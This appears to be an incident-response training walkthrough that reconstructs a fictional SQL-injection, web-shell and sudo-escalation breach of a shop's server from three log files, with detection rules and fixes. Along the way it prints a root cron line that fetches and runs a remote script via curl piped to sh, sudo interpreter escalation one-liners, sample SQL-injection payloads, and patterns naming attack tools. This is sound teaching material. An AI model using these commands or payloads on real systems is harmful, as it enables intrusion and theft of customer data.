ShopNest — what actually happened

A complete, start-from-zero guided investigation of three real-looking log files. By the end you will have found, proved and explained a full website compromise — from anonymous reconnaissance to a stolen customer database — using nothing but text files, counting, and reasoning.

The one-paragraph answer

A criminal crew quietly stole the admin account's credentials with an automated SQL injection attack on the shop's search box on 3–4 August 2026. They logged into the admin panel on 5 August, uploaded a web shell disguised as a product banner image, used a misconfigured sudo rule to become root, dumped the customers, orders and users databases into a tarball, and uploaded it to an attacker-controlled server on 5 August at 17:29 UTC. They installed hourly and backdoor-account persistence, deleted their staging directory, quietly altered a product's price, and kept coming back for weeks. Nothing about it was ever visible to a customer. The only reason we know is that the three logs were correlated.

1. The one big idea

If you delete everything else from this page, keep this section.

You cannot find the attack. You can only recognise it as not normal.

Nobody ever writes a log line saying "I have been hacked." The attacker's requests look exactly like requests. The only way to find them is to answer the question "what does a normal Tuesday look like on this server?" — and then notice what does not fit.

That is why the order of this walkthrough is not optional: baseline first, anomaly second, proof third. Analysts who skip the baseline spend days chasing 4,000 harmless requests from search-engine crawlers.

And the second big idea: one log is a rumour, two logs are proof.

Every finding in this case gets corroborated. The web server says the attacker ran sudo at 14:41:22 — and the system log says www-data really did, at 14:41:23. The access log says curl went out at 17:29:20 — and the firewall log records the TCP handshake to a stranger's server at 17:29:20. Neither log alone is convincing. Together they are a case.

How to use this page
Read it straight through the first time — it is written as a story, not a reference. Every section ends with a ANSWER box so you can check yourself, and every claim comes with a real log line you can copy out of the file yourself. After the story, section 7 tells you which parts of the course's own answer key are wrong or incomplete, and why.

2. How to search the logs

You do not need to install anything. Pick whichever of these suits you.

Option A — a text editor (simplest)

Open the log in VS Code, Notepad++ or Sublime and use Ctrl+F / Cmd+F. This page gives you an exact string to search for every single time, so you never have to guess a pattern. Always note the line number your editor shows — analysts cite evidence as file:line, and so does this page.

Option B — the command line (fast once you learn it)

3.4 The three clocks — get this right or everything after it is wrong

The number one mistake beginners make
Do not assume the files are in time order, and do not assume they contain the same events. Each file is a different sensor, and each one is sampled independently. The 1,009 cron executions, the 969 firewall beacons and the 45 DNS lookups for the same malicious domain are three different partial views of one campaign. The counts will not match exactly — and that is not a bug. It is your proof that these are independent logs, and it is why a good report says "at least N" rather than "exactly N".
Q1 — What produced each file, what is its format, and what is its date range?
Apache 2.4 web server (24,039 lines, combined format) · Ubuntu host via rsyslog (8,570 lines, program[pid]: format) · UFW / iptables netfilter kernel log (11,285 lines). All three span 16 Jun 2026 00:00:10 → 18 Sep 2026 23:47 (access) / 23:54 (firewall) UTC.
Evidence: the first and last line of each file. First access line = the UptimeRobot heartbeat at 16/Jun/2026:00:00:10; last = a customer fetching /favicon.ico at 18/Sep/2026:23:47:18.

4.2 The 20-minute heartbeat

Something fires every 20 minutes, all day, for 95 days, and never varies by a second. Find it:

52.40.44.11 - - [16/Jun/2026:00:00:10 +0000] "GET /heartbeat.php HTTP/1.1" 200 18 "-" "Mozilla/4.0 (compatible; UptimeRobot/2.0; …)" 52.40.44.11 - - [16/Jun/2026:00:20:10 +0000] "GET /heartbeat.php HTTP/1.1" 200 18 "-" "Mozilla/4.0 (compatible; UptimeRobot/2.0; …)" 52.40.44.11 - - [16/Jun/2026:00:40:10 +0000] "GET /heartbeat.php HTTP/1.1" 200 18 "-" "Mozilla/4.0 (compatible; UptimeRobot/2.0; …)"

Proof it is not an attacker: measure the gaps between consecutive hits. All 6,839 intervals are exactly 1,200 seconds. Zero jitter. 100% 200. And the only path it ever requests in 95 days is /heartbeat.php. It is UptimeRobot, a free monitoring service, and the 18-byte reply is the body of heartbeat.php. Completely benign.

The lesson in one line
A machine-perfect pattern is a machine, not a person. Humans do not produce 6,839 identical intervals. When something is too regular, suspect automation — but always ask whose automation before you panic. Sometimes it is your own uptime monitor, and reporting it as an intrusion is how analysts lose credibility.

4.4 The week-long hole — and why it matters enormously

Now list the days morgan appears, and look for a gap:

# which days does the admin show up in the web log?
grep "203.0.113.150" shopnest_access.log | grep -oE '[0-9]{2}/[A-Za-z]{3}/[0-9]{4}' | sort -u
Mon 3 Aug · Tue 4 Aug 2026
The last normal days before the attack
morgan works exactly as always: SSH at 15:21 and 15:42 running sudo systemctl status apache2, plus the three familiar web-admin pages. This is the last clean day.
5 Aug → 12 Aug 2026  — 8 days, no morgan at all
The gap
Nothing. Zero SSH sessions and zero /admin/ requests from 203.0.113.150 for eight consecutive days, spanning a weekend and two weekdays (5, 6, 7, 10, 11 August). There are no successful SSH logins at all on 5–11 August; morgan's next SSH is Wednesday 12 August, and the web-admin pages only resume on Thursday 13 August.
Wed 12 Aug 10:08 → Thu 13 Aug
Back to normal
Accepted publickey for morgan returns, then sudo apt-get update (sudo L4595), and the familiar three admin pages.

Explanation: annual leave. The most boring explanation available, and the correct one — a human being was on holiday. This is precisely why you build a baseline: the absence of your own administrator is the loudest possible signal that something is happening in the gap. Silence is data.

The trap
The attacker logs into /admin/ on 5 August at 13:12 — the very first day of the gap. A student who skipped the baseline sees "admin logged in, admin browsed users.php and customers.php" and thinks it is routine. A student who built the baseline sees five impossible things at once: the wrong IP, the wrong browser, the wrong pages (morgan has never opened users.php or customers.php in 95 days), the wrong hour (13:12, not 09:00–11:00), and the wrong week entirely.

4.7 The 15 August outage — and the coincidence worth studying

Nine customers received HTTP 503 that morning:

31.45.10.196 - - [15/Aug/2026:03:02:30 +0000] "GET / HTTP/1.1" 503 632 "-" "Mozilla/5.0 (Windows NT 10.0; …) Chrome/126.0.6478.127 Safari/537.36" 89.36.210.94 - - [15/Aug/2026:03:02:36 +0000] "GET / HTTP/1.1" 503 627 "-" "…" 92.38.149.55 - - [15/Aug/2026:03:02:38 +0000] "GET /shop/product.php?id=12 HTTP/1.1" 503 574 "-" "…" 66.249.77.12 - - [15/Aug/2026:03:02:48 +0000] "GET /cart.php HTTP/1.1" 503 945 "-" "…" 71.187.41.227 - - [15/Aug/2026:03:03:05 +0000] "GET /shop/index.php HTTP/1.1" 503 806 "-" "…"

Now the matching system log — this is the answer to "what legitimate event caused it?":

syslog L4849 Aug 15 03:02:10 web01 systemd[52021]: Stopping The Apache HTTP Server. syslog L4850 Aug 15 03:02:25 web01 systemd[72717]: Stopped The Apache HTTP Server. syslog L4851 Aug 15 03:02:30 web01 systemd[30911]: Starting The Apache HTTP Server. syslog L4852 Aug 15 03:02:42 web01 systemd[80773]: Started The Apache HTTP Server.

Correlation, second by second: Apache stopped at 03:02:10; the first 503 lands at 03:02:30 — the exact second the Starting event is logged; the last 503 is at 03:03:05; Apache reports Started at 03:02:42. That is a 32-second planned restart, at 03:02 UTC on a Saturday — the classic low-traffic maintenance window. Corroboration that patching was the purpose: unattended-upgrades: All upgrades installed at 06:41 the same morning, and morgan running sudo apt-get dist-upgrade at 09:10 that day (sudo L4877). This is the only Apache restart in all 95 days.

The nastiest coincidence in this entire exercise
Two minutes before Apache went down, at 15 Aug 03:00:03, this line appears:
Aug 15 03:00:03 web01 CRON[35594]: (root) CMD (curl -fsSL https://sync.cdn-serve.net/dns-upd.sh | sh >/dev/null 2>&1)
That is the attacker's hourly malicious cron job (you will meet it in 5.9). It fires exactly 120 seconds before the outage. A tired analyst sees "malicious cron → outage" and declares the attacker took the website down. That would be wrong. The job runs 24 times a day, sends all output to /dev/null, and touches nothing Apache-related; it simply happened to fire at 03:00:03, like it does every hour. The real cause is the four systemd lines above it.

The rule: a job that fires hourly will fall within a couple of minutes of something roughly 1% of the time. Temporal adjacency is not causation. Always find the mechanism in a second log before you blame the attacker.

What vulnerability is this, and which parameter holds the flaw?

SQL injection, explained in one paragraph
The shop's search box builds its database query by gluing whatever the visitor typed straight into the SQL text — something like SELECT … FROM products WHERE name LIKE '%q%' — instead of passing the value to the database separately as data. Because the application never separates code from data, a visitor can close the quote, append their own SQL, and comment out the remainder with -- (two dashes). The one vulnerable parameter is q on /shop/search.php. The correct fix is a parameterised query (prepared statement), where the SQL text and the user's value travel separately and can never merge.

The evidence that the injection actually worked is in the status codes and the byte counts — something the answer key gets right but never quantifies:

StatusCountResponse sizeWhat it means
2005587,059 – 41,925 bytes (avg 24,852)The query ran. A full search-results page came back — which is exactly how the rows an injected UNION SELECT adds get displayed to the attacker.
500172257 – 1,099 bytes (avg 687)MySQL threw an error — a tiny error page instead of a results page. You can see the difference in the log, because the byte count collapses from ~25 KB to ~0.7 KB.

A 500 here does not mean the attack failed. It means the database rejected that particular malformed statement while sqlmap was still mapping the schema — and sqlmap wants those errors, because they leak the table structure. It is a 500 as a stepping stone, not a wall.

A 500 is NOT a reliable alarm on this server
This site produces 319 HTTP 500s across 95 days — about 1.6 per day — and only 172 of them belong to the attacker. The other 147 are ordinary customers tripping over ordinary pages (/favicon.ico, /cart.php, /css/shop.css, /account/login.php…), and 17 of those 147 are on /shop/search.php itself. A naive "alert on HTTP 500 in search.php" rule would therefore have produced 17 false positives across the baseline and still been easy to ignore.

What actually makes this detectable is the conjunction of four things: a recognised attack-tool User-Agent + hundreds of requests concentrated into two days + every single request aimed at one parameter + SQL keywords (UNION, SLEEP, EXTRACTVALUE, CONCAT) in the query string. Any one of those four on its own is noise. All four together is proof. This is the single most important lesson about detection engineering in the whole case.

Q15 — Can you prove the attacker used the credentials from the database dump?
Yes — and here is the reasoning, which is stronger than mere sequence.

Step 1 — the credentials existed in the database and were extractable. The very first request of the SQLi run (access L11748, 3 Aug 10:02:04) contains CONCAT(username, 0x7e, password) FROM users. An attacker guessing credentials would be lucky to get in and would go straight for the money; this actor took 42 seconds to look at the credential list first.

What an auditor would verify — four checks, any one of which would have stopped it:
CheckWhat it reveals, and why it matters
1. Extension.php sitting in an uploads directory. An image-upload feature must never accept an executable extension. This is the primary control and it was missing.
2. MIME typeA real browser upload sends Content-Type: image/jpeg. A PHP file arriving labelled image/jpeg is a mismatch. But note carefully: MIME type is attacker-controlled (it is just a header they typed), so it must never be the only check — it is defence in depth, not defence in itself.

  • That the attacker had remote code execution, not merely a file upload. This is the step where "I can add a file" becomes "I can run code".
  • A free vulnerability report. phpinfo() prints the PHP version, every loaded module, disable_functions, the document root, open_basedir, temp paths, environment variables and often database credentials left in the environment. It told the attacker exactly which shell functions are available to them and where everything lives on disk.

Note the gap in the log that most students miss: the access log records the request, not the filename of the uploaded content — the POST body is not logged. The only reason we know the file is called store_theme_v3.php is that the attacker requested it back 106 seconds later. That follow-up request is the evidence. Q20 — Decode the Python one-liner. What does it do at the OS level, and what single privilege does it grant?
URL-decoded, the command is: 
sudo python3 -c 'import os; os.seteuid(0); print(os.geteuid())'
Break it into three pieces:
  • sudo python3 — run the Python interpreter as root. This is the entire trick. Everything else is decoration.
  • import os — load Python's interface to the operating system.
  • os.seteuid(0) — the system call that sets the effective UID to 0. In Linux, UID 0 is root; there is no more privileged identity than that. The process is already root because sudo launched it, so this call mostly just makes the program notice.
  • print(os.geteuid()) — read the effective UID back and print it. Expected output: the single character 0. A 200 response of 2,079 bytes means it ran and returned something.
What single privilege does it grant? An arbitrary root code-execution primitive. That is, the attacker can now run any program they like as root, because they can run the interpreter, and an interpreter can do anything. No kernel exploit was needed, and none was used. The entire escalation is a one-line configuration mistake.

Then compare the id output, as the worksheet asks. At 14:05:11 cmd=id returned the identity of the web user — uid=33(www-data) gid=33(www-data) groups=33(www-data) (UID 33 is Ubuntu's standard www-data). At 14:46:48 the same command returns uid=0(root) gid=0(root) groups=0(root). The syslog removes all doubt: session opened for user root by www-data(uid=0) (L3804). From 14:46:48 the attacker is root.
Q20b — The root cause in configuration. What was misconfigured, where is the line, and what should it be?
The one misconfiguration: someone granted the web service account passwordless sudo for a general-purpose interpreter. The sudoers rule looks like this: 
# /etc/sudoers  — or a drop-in file such as /etc/sudoers.d/www-data
www-data ALL=(ALL) NOPASSWD: /usr/bin/python3
Where an auditor finds that line: in /etc/sudoers and in every file in /etc/sudoers.d/. The safe way to read it is grep -rn www-data /etc/sudoers /etc/sudoers.d/ and visudo -c (which validates syntax and shows the effective rules including anything pulled in by #includedir). On a live incident, also check for a sudoers file modified during the attack window — sometimes the attacker adds their own rule to keep access after the misconfiguration is fixed.

What it should be changed to: deleted. There is no safe version of "the web server may run Python as root without a password". If a legitimate job genuinely needs privilege, give that job a narrow rule with a fixed command and restricted arguments (/usr/local/bin/backup.sh), and never a general-purpose interpreter or utility — python3, perl, bash, sh, awk, find, vim, less, tar, env, docker. Each of those lets the caller run arbitrary code as root, which is the same thing as giving them root.

The deeper problem, which a good report will also name: www-data should not be in sudoers at all. The web service account exists to serve files and nothing else. It should have no interactive login, no sudo, and ideally a restricted shell, so that a web-application compromise cannot become a host compromise automatically.
Evidence: access L12928 / L12929 / L12930; syslog L3800–L3805. A supporting statistical clue: the syslog contains 44 sudo lines, of which 38 are morgan's routine apt-get update / systemctl status apache2 and exactly 6 are www-data on 5 August. Frequency alone flags it.
The generalisable lesson — this is the whole class of bug
"Service account X has passwordless sudo for interpreter Y" is the single most common Linux privilege-escalation misconfiguration in production, and it is always root in one step, because an interpreter can do anything. The classic textbook variant is www-data ALL=(ALL) NOPASSWD: /bin/bash, which you bypass with sudo /bin/bash -c 'id'. Audit for it in every incident, because attackers look for it every time — it is step five of every manual intrusion playbook.

Q22 — Which database credentials were used, and what does that imply?

5.9 Persistence #1 — the hourly cron job

Two minutes after the upload finishes, the attacker installs a permanent backdoor. One line, written into a standard Linux cron directory:

PartMeaning

* * * *Every hour, every day, every month, every day of the week.
rootRun as root. (This field is required in /etc/cron.d/ format, which is why the syslog line reads (root) CMD rather than (www-data) CMD.)

The schedule, stated plainly: at 00 minutes past every hour, 24 times a day, every day, as root, indefinitely — until a human deletes the file. Note also that the whole thing cost the attacker one HTTP request. Compare that to the effort of the SQLi (730 requests) and the web shell: persistence is the cheapest, most durable thing an attacker can install, which is why you must hunt for it explicitly.


What is curl … | sh, and why is it worse than downloading a file?

  • It executes; downloading does not. curl -fsSL URL prints the script to standard output; the | pipes that straight into sh, which runs it immediately — as root, with no file and no human in the loop.
  • Nothing is written to disk. File-based malware leaves an artefact you can hash, scan, quarantine and hunt for with EDR. curl | sh leaves nothing but a cron line. While it runs, the script exists only in a process's memory, and it is gone the moment the process exits. There is no file for a forensics team to recover.
  • Nothing is pinned. The URL is a variable, not a file. The attacker can change what this host executes at any moment, unilaterally, without touching the server again. A harmless beacon today can become a ransomware dropper or a coin-miner next month, and the only change happens on their side. This is the difference between a breach and a backdoor.
  • It defeats "check the file hash" controls entirely, because there is no file to hash. And routine Linux cron auditing — ls /etc/cron.d, crontab -l — only ever shows you that something will run, never what it will fetch. You have to read the URL and ask whether it belongs.
  • It looks legitimate to a lazy reviewer. curl and sh are both entirely normal utilities. There is no obviously malicious binary name to grep for.

And >/dev/null 2>&1 completes the disguise: no stdout, no stderr, no mail to root. The job is invisible in routine administration — which is why it survived forty-two days and fired more than a thousand times before anyone looked.

Why 969 and not 1,009? Because the firewall log is sampled independently (see 1.4) — roughly 96% of cron runs have a matching recorded SYN. This is normal for high-volume firewall logging and is exactly why you report "at least" counts.

  • (b) Prepared for a different operator. The account may have been created for onward resale of the access, or for a second crew who has not arrived yet.
Either way the response is identical, and it is not "delete it and move on":
  • Disable the account, do not merely delete it: usermod -L sysbackup; usermod -s /usr/sbin/nologin sysbackup; passwd -l sysbackup — and set an expiry so it cannot be used later. Deleting the line makes the intrusion harder to investigate and throws away evidence; disabling preserves both.
  • Preserve evidence first. Before you touch anything: capture /etc/passwd, /etc/shadow, /etc/group, /etc/sudoers and /etc/sudoers.d/, /home/sysbackup (recursively, including hidden files and .ssh/authorized_keys), the shell history, /var/log/auth.log in full, and a full disk image if the legal threshold warrants it.
  • Extract and check the password hash. It was set through pam_unix, so it is a real hash in /etc/shadow. Crack it if you can — it may be reused from the stolen database, which would be a further link to the SQLi, and it may appear in other accounts.
  • Hunt for siblings. Search all hosts for useradd|groupadd|usermod|chpasswd and for any UID ≥ 1000 with /bin/bash and no human owner. A crew that created one account on one server usually created more elsewhere.
  • Fix the group membership permanently. Audit getent group sudo and getent group wheel on every host. A web service account being in sudo (section 5.6) and a mystery account in sudo (here) are the same disease.
  • Report it. A persistent unauthorised root-equivalent account is a reportable finding in its own right, independent of the data theft, because it means the attacker retains access unless you act. Assume it is still there until you have positively verified removal.

Q31 — Why does a 400 prove this attack failed here? Think about what the parameter does.
Because 400 Bad Request is the application itself refusing the request before any SQL runs. Here is the airtight proof from the log, and it requires no theory at all:

The product.php evidence: that file contains 3,322 requests to /shop/product.php across 95 days. Of those, exactly 338 have a id= value that is not a plain number — and all 338 of them belong to 144.217.31.248. Every other request from every other visitor in 95 days has an id of pure digits (?id=12, ?id=277, ?id=405…).

What that proves: /shop/product.php takes a numeric identifier and validates it as numeric — it almost certainly casts it with (int)$_GET['id'] or binds it as an integer. Once the value is coerced to an integer, there is nothing left to inject: "1' OR 1=1-- -" becomes 0 (or 1), which is a valid but meaningless product number. The quotes, the keywords, the -- comment — all of it is discarded by the cast before the query is ever built. SQL injection is structurally impossible on that parameter.

And the status code is the app telling you so, 338 times: 400 Bad Request means "your input was malformed and I am not going to process it". Compare the three response sizes, which is a lovely detail: Actor B's 400s run 291–1,346 bytes (short validation-error pages of varying wording), whereas Actor A's successful 200s run 7,059–41,925 bytes and its 500s run 257–1,099 bytes (short MySQL error pages). Two different small-page populations from two different failure modes.

So the answer to "why does 400 prove failure" is: the request never reached the database. A 200 means the query executed; a 500 means the database executed something and complained; a 400 means the database was never involved. sqlmap kept firing for eight days because it is automated and does not read status codes carefully — which is exactly why an eight-day, 338-request, fully automated, textbook SQL-injection attack left not one single byte of ShopNest's data in the attacker's hands.
The lesson, stated as a rule you can take to any job
"Somebody ran sqlmap" is NOT the same as "we were breached". Attack signatures and attack outcomes are different things, and only the second one is an incident. The correct triage order is:
(1) Outcome — did any request succeed where it should have failed (200/302 on an admin or upload endpoint)? · (2) Follow-on activity — did the same IP then appear somewhere it has never been? · (3) Second and third logs — does the syslog or firewall corroborate it? · (4) Only then: the tool signature.

An alert that fires on the UA string alone would have fired twice in 95 days and been wrong half the time. An alert that fires on successful authentication from an unexpected source would have fired once, and been right.

  • It fires on ordinary people. Search for "women's coat", "3' pipe", "kids' bikes", or an inch mark in a product name, and the rule lights up. Every one is a false positive, and false positives are how alerts die: analysts start ignoring the channel, then miss the real one.
  • It fires on the attacker's early reconnaissance anyway — and still misses the breach. Actor A's first request on 3 August (L11748) is 28,681 bytes of nested CONCAT/information_schema payload.   • It teaches the attacker to evade cheaply. A determined actor simply removes the quote (1 AND SLEEP(5)-- - works without one; there are 60+ such payloads in this log). So the rule costs you alert fatigue and buys no protection.
The correct rule is contextual, not lexical: fire on a known attack-tool User-Agent OR a high request rate against one parameter OR a set of SQL keywords together — and then corroborate with a successful outcome before paging anyone. Attack intent and attack success are different alerts at different severities.

7.4 Attribution — what you can and cannot conclude

Assessment (the kind of paragraph a real report contains):

This actor was targeted rather than opportunistic. Opportunistic attacks spray many targets with cheap automated payloads and accept whatever falls out; this one shows a deliberate, staged campaign against a single identified host — four days after an anonymous reconnaissance visit that specifically located /admin/login.php and probed for configuration leaks, the attacker returned with a 730-request, two-day, multi-technique SQL injection campaign (time-based, boolean, error-based and UNION) whose first payload already asked for username, password FROM users. They then waited roughly 26 hours — the signature of offline bcrypt cracking — before spending a single login attempt, which only makes sense if the password was already known. Escalation was minimal and surgical: a web shell, one sudo -l to read the rules, one interpreter invocation to become root. Exfiltration was clean and single-shot — three tables, one archive, one upload, then immediate destruction of the staging directory. That profile is consistent with a financially motivated criminal crew targeting e-commerce and payment-adjacent data (customer PII plus order and payment references), and it is inconsistent with a state actor, who would be expected to establish covert, long-duration access and would have no reason to alter a retail price.

The limits of log-only attribution — say these out loud in your report
  • An IP is a location, not a person. VPNs, proxies, Tor and cloud hosts mean the source address may be one person, a criminal VPS, or a botnet node. Treat every IP IOC as "this infrastructure was used", never "this person did it".
  • Attribution by tooling is weak. sqlmap 1.7.5 is free and used by everyone from students to state actors. Matching tool versions is not attribution.
  • Timing and geography are suggestive, not probative. The attack ran 09:00–18:00 UTC, a European working day, and the crew was active at 22:03 and 20:45 on other dates — consistent with EU time zones, but that is also where the server and its owner are, so it proves nothing about the attacker.
  • Real proof needs things logs do not contain: a takedown or sinkhole of 198.51.100.77 and sync.cdn-serve.net (registration data, payment records, customer details); the recovered full-dump.tar.gz and its contents; the sysbackup password hash; subscriber records for 185.220.101.4; and any artefacts recovered from disk or memory.
  • State your confidence, then state what would raise it. "MEDIUM-LOW, and a sinkhole of 198.51.100.77 would raise it to HIGH" is a professional sentence. "It was a Russian group" is not an assessment, it is a guess.

8.1 Detection rules — with measured false-positive counts

For every rule: the logic, and a count of how many times it would have fired across the 95-day baseline. A rule you have not measured is a rule you do not trust.

Rule (a) — attack-tool User-Agent combined with an error burst

# PSEUDO-SIEM. Fire on the TOOL plus a burst plus 5xx — never on the tool alone.
index=access
| where user_agent matches "(?i)(sqlmap|nikto|nessus|masscan|nmap|gobuster|dirb|fuzzscanner)"
| stats count() as reqs, dc(path) as paths, sum(case status==500 then 1 else 0 end) as errs
        by src_ip, bin(_time, 15m)
| where reqs > 20 and errs > 0
| alert severity=high

# PLUS the semantic layer that actually distinguishes the breach from the false positive:
index=access
| where user_agent matches "(?i)sqlmap" AND path="/shop/search.php"
| where uri_query matches "(?i)(union\s+select|sleep\s*\(|extractvalue|benchmark\s*\(|information_schema|concat\s*\(.*0x7e)"
| stats count() as reqs by src_ip, bin(_time, 1h)
| where reqs > 50
| alert severity=critical  title="SQL injection in progress on a TEXT parameter"

Measured false positives on this baseline: the first rule fires on 91.92.244.55 (2 windows on 3–4 Aug) and on 144.217.31.248 (8 windows in Aug) — 10 fires, 8 of which are the failed actor. The second, semantic rule fires on 91.92.244.55 only — 2 fires, both correct, because 144.217.31.248 was aiming at the integer parameter and the customer who typed 'toy' contains no SQL keyword at all. Run the second one. Also add a standalone rule for a 500 rate on one URL from one IP: measured baseline is 172 attacker hits versus 17 legitimate customer 500s, so require a burst (say ≥ 20 in 15 minutes) or you will page someone about a customer's failed cart.

Rule (b) — admin-panel login from an unexpected source

# The highest-value rule in this whole case. Its false-positive count is ZERO.
index=access
| where path="/admin/login.php" AND method="POST" AND status="302"
| where src_ip != "203.0.113.150"          ← learned from the baseline, not assumed
| alert severity=critical  title="Successful admin authentication from a non-baseline IP"

# Companion rules, same baseline logic:
index=access | where path startswith "/admin/" | stats count() by src_ip, bin(_time,1h)
  | where src_ip != "203.0.113.150" AND count > 3   # 91.92.244.55: 5 in 101 s; Nikto: 12 in 1 h on 2 Aug
index=access | where path="/admin/customers.php" OR path="/admin/users.php"
  | alert severity=high  title="Sensitive admin page accessed"   # morgan NEVER opens these in 95 days
index=syslog | where program="sudo" AND message matches "^www-data"
  | alert severity=critical  title="Web user invoked sudo"          # ZERO occurrences in 95 days of baseline

Measured false positives: 0 for the first rule — all three 302s in the file are the attacker, and none is from 203.0.113.150. The www-data-invoked-sudo rule is likewise 0: 38 of the 44 sudo lines are morgan's, and the other 6 are the attacker. These are the rules that would actually have stopped this incident on 5 August.

Rule (c) — egress anomaly: a destination never seen in the baseline

# Learn the allow-list from 30 days of clean traffic, then alert on drift.
index=firewall src_ip="203.0.113.42" out_interface="eth0"
| stats dc(src_ip) as peers by dst_ip, dst_port
| lookup baseline_peers dst_ip NOT in baseline_list          # 1.1.1.1:53, 198.51.100.15:443, 198.51.100.30:443
| lookup known_bad dst_ip IN threat_feed dst_ip
| alert severity=critical  title="Egress to a destination outside the baseline"

# Second-order rule: a NEW destination that also receives a large byte count.
index=firewall out_interface="eth0"
| stats sum(len) as bytes, count() as pkts by dst_ip, dst_port, bin(_time,1h)
| lookup bytes_threshold dst_port="443"
| alert severity=high  title="High-volume outbound TLS to a new peer"

# And the DNS layer, which is cheaper and earlier than the firewall layer:
index=syslog | where message matches "dnsmasq: query\[A\] \S+"
  | where queried_domain != "shopnest.com"
  | stats count() by queried_domain
  | lookup queried_domain NOT in known_domains
  | alert severity=medium  title="Resolver queried a domain never seen before"

Measured false positives: 0 on this baseline. That is why DNS logging on the resolver is worth more than firewall logs for this class of detection: you see the intent before the transfer.

index=syslog

8.2 Root-cause fixes — and which stage each one would have stopped

Note the discipline of the question: root-cause, not band-aids. "Patch the SQL injection" is a band-aid if the code path that concatenates strings still exists. These five remove links in the chain rather than plugging individual holes.

#Root-cause fixStage it stopsWhy it is a root cause, not a patch
1 Replace all string-concatenated SQL with parameterised queries (prepared statements) across the entire application, and add a lint/CI rule that fails the build on any query built by concatenation or interpolation. Give search.php a PDO prepared statement with the value bound as a parameter. Initial Access — ends the incident on 3 Aug at 10:02:04 Every stage after this one exists only because the injection worked. A prepared statement makes the class of bug unwriteable, not just this instance. The CI gate stops it coming back in the next feature.
2 Never let a web-facing service account hold sudo. Remove www-data from sudoers entirely. Delete the NOPASSWD: /usr/bin/python3 rule. Audit /etc/sudoers + /etc/sudoers.d/ on every host (visudo -c, grep -rn www-data /etc/sudoers*). Where a privileged job is genuinely required, use a named wrapper script with a fixed argument list, a systemd timer unit with tight Protect* sandboxing, and no interpreter in the sudoers line. Privilege Escalation — ends it on 5 Aug at 14:46:34, and with it the database dump, the exfiltration and the backdoor account This is the root cause of the scale of the breach. A web-application bug should cost you one application, not the whole host. Removing the escalation collapses nine of the twelve timeline stages at once — the single highest-value change on this list.
3 Make uploads structurally incapable of executing. (a) Store uploads outside the document root, or in a directory served with php_admin_flag engine off / RemoveHandler .php; (b) allow-list extensions (.jpg .png .webp only) and reject everything else; (c) rename every stored file to a random server-generated name, so the attacker's chosen name never reaches disk; (d) validate content with magic-byte inspection, not the client-supplied MIME type; (e) store outside /var/www/html and serve via a controller that sets Content-Disposition: attachment and X-Content-Type-Options: nosniff. Web shell — ends it on 5 Aug at 14:02:09, and everything after Renaming and off-root storage defeat the entire class, including novel shells and double extensions. Relying on extension checks alone is the band-aid; the structural control is "nothing a user uploads can ever be executed by the web server".
4 Least-privilege, rotated, non-interactive credentials — end to end. Give the app and the backup job separate read-only database accounts scoped to the tables they need (never root); require real passwords stored in a secret manager, not in world-readable config; remove -u root passwordless access; require key-only SSH with PasswordAuthentication no (as already true here — keep it); add MFA on /admin/; and alert on any useradd/usermod/passwd event (one occurrence in 95 days is trivially detectable). Account takeover (blocks the 5 Aug login) and Collection (the mysqldump chain) and Persistence (the sysbackup account) Three separate stages die here, because all three share one root cause: credentials that are over-privileged, reusable, unrotated and stored in plaintext. Note the attacker's SQLi succeeded precisely because the app's DB credential was a superuser — so this is also a defence-in-depth control against injection.
5 Centralise, retain and alert on the telemetry that made this analysis possible. Ship all three logs off-host to immutable storage (they can be deleted by a root attacker); centralise with real parsing so the three clocks are aligned; retain 12–18 months; centralise DNS query logs; ship Apache logs with the POST body redacted but present so upload filenames are recoverable; and implement the five rules from 8.1 as live alerts — especially the zero-false-positive ones: admin 302 from a non-baseline IP, www-data invoking sudo, new-account creation, and script-piped execution from cron. Add a quarterly egress review and a visudo review to the change process. Detection & response — does not prevent stage 1, but converts a 72-day, undetected, unlogged breach into a 1-day, detected one Because every other failure here was human or process, not purely technical, the organisational control is a legitimate root cause. Concretely: rules (b) and (e) have a measured false-positive count of zero over 95 days, so there is no excuse not to run them — and they would have caught this at three separate points.
The order to argue in your report
Contain → eradicate → recover → prevent. Note the leverage: fix #2 alone would have ended this incident at 14:46 on 5 August — before the data was ever touched — and cost about one line in a configuration file. That is the lesson, and it is the sentence your CFO needs to hear: the data breach was a configuration mistake, not a sophisticated attack.

Summary

Between 3 and 5 August 2026 an external criminal actor compromised ShopNest's single web server and stole a complete copy of the customer, order and staff-user databases. The attacker used an automated SQL-injection attack against the public product-search function to extract an administrator's credentials, used those credentials to log into the admin backend, uploaded a malicious script through the product-image upload feature, escalated to root via a misconfigured sudo rule, and uploaded the resulting archive to an attacker-controlled server at 17:29 UTC on 5 August. The intrusion was not detected by ShopNest and the attacker retained access for a further 72 days, maintaining a hidden hourly backdoor and a dormant root-privileged account. No customer facing outage, error or unusual activity was observed at any point.

Recommended actions — in order

CONTAIN (do within hours)

  1. Do not power the host off. Snapshot it first — memory holds the shell session, the tar output, and the C2 traffic. Capture volatile state, then image the disk, then remediate. (The attacker deleted /tmp/shop; a disk image or snapshot may still hold the archive, and it is the only physical proof of exfiltration.)
  2. Isolate web01 from the network while preserving an admin path. Block all egress to 198.51.100.77 and DNS for sync.cdn-serve.net at the perimeter immediately.
  3. Disable, don't delete, the backdoor: lock sysbackup, set its shell to nologin, set an expiry, and preserve /home/sysbackup and /etc/shadow for examination. Remove /etc/cron.d/dnsupdater (archive a copy first as evidence).
  4. Quarantine the web shell — copy /var/www/html/uploads/store_theme_v3.php for hashing and analysis, then remove it and the pid=87 upload record. Do not delete anything else in /uploads/ without checking it.
  5. Rotate every credential that lived on that host: the compromised /admin/ account, all users-table accounts, the MySQL superuser, every SSH key (morgan's fingerprint is SHA256:of6N8kZhJf7wQb3S4UcP39Jq5stzzsIuVd0H7lk2aBc), plus all application API keys and payment-gateway credentials. Force-reset, do not merely rotate in place.

ERADICATE (this week)

  1. Rebuild web01 from a known-good image. Never "clean" a host that had root — you cannot prove what was replaced.
  2. Fix, in this order: (i) remove www-data from sudoers; (ii) parameterise the SQL in search.php and audit every other query; (iii) lock down the upload path (allow-list, off-root storage, random filenames, magic-byte validation, PHP execution disabled in the uploads directory); (iv) replace the passwordless superuser with a scoped, rotated credential; (v) require MFA on /admin/.
  3. Hunt for the same actor across all other assets: search every web log for 91.92.244.55, 144.217.31.248, 185.220.101.4, 198.51.100.77 and sync.cdn-serve.net; search all auth logs for sysbackup, useradd and usermod; search all cron directories and systemd units for curl … | sh; search all hosts for a passwordless-sudo rule on a service account.
  4. Assess the price changes to product 83: identify any orders transacted at the altered price and consider refunds, chargeback defence and customer notification.

